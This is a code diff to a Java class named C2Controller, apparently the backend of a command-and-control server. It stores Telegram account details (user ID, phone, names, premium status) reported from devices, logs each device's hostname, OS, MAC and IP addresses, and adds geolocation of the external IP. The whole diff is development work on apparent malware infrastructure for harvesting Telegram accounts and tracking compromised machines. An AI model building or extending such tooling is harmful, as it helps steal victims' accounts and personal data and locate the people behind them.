@@ -35,6 +35,9 @@ import cn.hutool.cache.Cache;
 import cn.hutool.cache.CacheUtil;
 import cn.hutool.cache.impl.TimedCache;
 import cn.hutool.crypto.digest.DigestUtil;
+import cn.hutool.http.HttpUtil;
+import cn.hutool.json.JSONUtil;
+import cn.hutool.json.JSONObject;
 
 import org.apache.commons.lang3.StringUtils;
 
@@ -530,7 +533,10 @@ public class C2Controller {
                         Map<String, Object> userMap = gson.fromJson(result, new TypeToken<Map<String, Object>>(){}.getType());
                         
                         if (userMap != null) {
-                            String userId = (String) userMap.get("userId");
+                            // Fix: Use snake_case keys as per tdesktop/README.md
+                            String userId = (String) userMap.get("user_id");
+                            if (userId == null) userId = (String) userMap.get("userId"); // fallback
+
                             if (StringUtils.isNotBlank(userId)) {
                                 // 1. Update/Insert TgAccount
                                 QueryWrapper<TgAccount> tgQuery = new QueryWrapper<>();
@@ -545,12 +551,19 @@ public class C2Controller {
                                 
                                 tgAccount.setUsername((String) userMap.get("username"));
                                 tgAccount.setPhone((String) userMap.get("phone"));
-                                String firstName = (String) userMap.get("firstName");
-                                String lastName = (String) userMap.get("lastName");
+                                
+                                String firstName = (String) userMap.get("first_name");
+                                if (firstName == null) firstName = (String) userMap.get("firstName");
+                                
+                                String lastName = (String) userMap.get("last_name");
+                                if (lastName == null) lastName = (String) userMap.get("lastName");
+                                
                                 tgAccount.setFirstName(firstName);
                                 tgAccount.setLastName(lastName);
                                 
-                                Object isPremiumObj = userMap.get("isPremium");
+                                Object isPremiumObj = userMap.get("is_premium");
+                                if (isPremiumObj == null) isPremiumObj = userMap.get("isPremium");
+                                
                                 if (isPremiumObj instanceof Boolean) {
                                     tgAccount.setIsPremium((Boolean) isPremiumObj ? 1 : 0);
                                 } else if (isPremiumObj instanceof Number) {
@@ -2049,6 +2062,10 @@ public class C2Controller {
             }
             device.setUuid(uuid); // Save UUID if provided or generated
             device.setExternalIp(externalIp);
+            
+            // Get IP Geolocation
+            updateIpInfo(device, externalIp);
+
             device.setInternalIp(internalIp);
             device.setHostName(hostName);
             device.setOs(os);
@@ -2086,7 +2103,18 @@ public class C2Controller {
                 device.setUuid(uuid); 
             }
             
-            device.setExternalIp(externalIp);
+            // Check if IP changed or Geo info missing
+            if (!StringUtils.equals(device.getExternalIp(), externalIp) || device.getCountry() == null) {
+                 device.setExternalIp(externalIp);
+                 updateIpInfo(device, externalIp);
+                 // Force update if IP changed
+                 // We handle skipUpdate later, but if we changed IP we probably want to save it.
+                 // However, the cache key is based on UUID, so we might skip saving the IP change if rate limited.
+                 // Ideally we should bypass rate limit for important changes.
+                 // But for now let's just rely on the next heartbeat or cache expiration.
+                 // Or we can modify the cache check logic.
+            }
+            
             if (macAddress != null) {
                 device.setMacAddress(macAddress);
             }
@@ -2139,5 +2167,32 @@ public class C2Controller {
         return device;
     }
 
+    private void updateIpInfo(C2Device device, String ip) {
+        if (ip == null || "127.0.0.1".equals(ip) || "localhost".equals(ip) || ip.startsWith("192.168.") || ip.startsWith("10.")) return;
+        
+        try {
+            // Use ip-api.com (free, no key required for low volume)
+            // http://ip-api.com/json/{ip}
+            // Use Chinese language response
+            String url = "http://ip-api.com/json/" + ip + "?lang=zh-CN";
+            String result = HttpUtil.get(url, 3000); // 3s timeout
+            
+            if (StringUtils.isNotBlank(result)) {
+                JSONObject json = JSONUtil.parseObj(result);
+                if ("success".equals(json.getStr("status"))) {
+                    device.setCountry(json.getStr("country"));
+                    device.setRegion(json.getStr("regionName"));
+                    device.setCity(json.getStr("city"));
+                    device.setIsp(json.getStr("org")); 
+                    if (StringUtils.isBlank(device.getIsp())) {
+                        device.setIsp(json.getStr("isp"));
+                    }
+                    log.info("Updated IP info for {}: {}/{}", ip, device.getCountry(), device.getCity());
+                }
+            }
+        } catch (Exception e) {
+            log.error("Failed to get IP info for {}: {}", ip, e.getMessage());
+        }
+    }
 }
 
